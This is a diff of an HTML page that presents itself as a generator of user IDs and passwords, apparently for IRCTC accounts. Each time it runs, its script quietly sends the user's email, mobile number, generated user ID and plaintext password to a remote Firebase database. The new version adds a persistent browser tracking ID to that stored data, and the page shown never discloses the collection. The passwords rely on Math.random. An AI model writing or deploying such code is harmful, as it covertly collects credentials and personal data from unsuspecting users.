@@ -38,7 +38,7 @@ button{
 }
 button.copied{background:#28a745}
 textarea{height:100px;resize:none}
-input[readonly]{background:#f5f5f5;cursor:not-allowed}
+input[readonly]{background:#f5f5f5}
 </style>
 </head>
 <body>
@@ -76,13 +76,13 @@ input[readonly]{background:#f5f5f5;cursor:not-allowed}
   <textarea id="final" readonly placeholder="Final Output"></textarea>
 </div>
 
-<!-- FIREBASE COMPAT SDK -->
+<!-- FIREBASE -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
 <script>
-/* 🔥 UPDATED FIREBASE CONFIG */
-const firebaseConfig = {
+/* 🔥 FIREBASE CONFIG */
+firebase.initializeApp({
   apiKey: "AIzaSyCrnG8iz_JUgqiG8zVStqKBpicOF4m2SB0",
   authDomain: "iruserid-5c557.firebaseapp.com",
   databaseURL: "https://iruserid-5c557-default-rtdb.firebaseio.com",
@@ -90,24 +90,30 @@ const firebaseConfig = {
   storageBucket: "iruserid-5c557.firebasestorage.app",
   messagingSenderId: "234438715803",
   appId: "1:234438715803:web:2f254753f6b6827d6a193e"
-};
+});
 
-firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-/* 🔐 VERY STRONG PASSWORD (8–15) */
-function generateIRCTCPassword(){
+/* 🧠 UNIQUE BROWSER ID */
+let containerId = localStorage.getItem("containerId");
+if(!containerId){
+  containerId = "browser_" + Math.random().toString(36).substring(2,10);
+  localStorage.setItem("containerId", containerId);
+}
+
+/* 🔐 PASSWORD */
+function generatePassword(){
   const upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
   const lower="abcdefghijklmnopqrstuvwxyz";
   const number="0123456789";
   const special="@#$%&!";
   const all = upper + lower + number + special;
 
-  let pass="";
-  pass += upper[Math.floor(Math.random()*upper.length)];
-  pass += lower[Math.floor(Math.random()*lower.length)];
-  pass += number[Math.floor(Math.random()*number.length)];
-  pass += special[Math.floor(Math.random()*special.length)];
+  let pass =
+    upper[Math.floor(Math.random()*upper.length)] +
+    lower[Math.floor(Math.random()*lower.length)] +
+    number[Math.floor(Math.random()*number.length)] +
+    special[Math.floor(Math.random()*special.length)];
 
   const len = Math.floor(Math.random()*(15-8+1))+8;
   while(pass.length < len){
@@ -116,37 +122,35 @@ function generateIRCTCPassword(){
   return pass.split('').sort(()=>0.5-Math.random()).join('');
 }
 
-/* ⚡ GENERATE DATA */
+/* ⚡ GENERATE */
 function generate(){
-  const email = document.getElementById("email").value.trim();
+  const email = emailInput = document.getElementById("email").value.trim();
   const mobile = document.getElementById("mobile").value.trim();
   if(!email || !mobile){
     alert("Email & Mobile required");
     return;
   }
 
-  const base = email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();
+  const name = email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();
+  const digits = Math.floor(10 + Math.random()*90);
   const letters="abcdefghijklmnopqrstuvwxyz";
-
-  const id = base +
-    Math.floor(Math.random()*10) +
-    letters[Math.floor(Math.random()*26)] +
+  const userId = name + digits +
     letters[Math.floor(Math.random()*26)] +
     letters[Math.floor(Math.random()*26)];
 
-  const password = generateIRCTCPassword();
+  const password = generatePassword();
 
   pass.value = password;
-  userid.value = id;
+  userid.value = userId;
   phone.value = mobile;
   mailout.value = email;
 
-  final.value = `${id}\n${password}\n${mobile}\n${email}`;
+  final.value = `${userId}\n${password}\n${mobile}\n${email}`;
 
-  db.ref("userActivity").push({
+  db.ref("users/"+containerId+"/activity").push({
     email,
     mobile,
-    userid: id,
+    userid: userId,
     password,
     time: Date.now()
   });
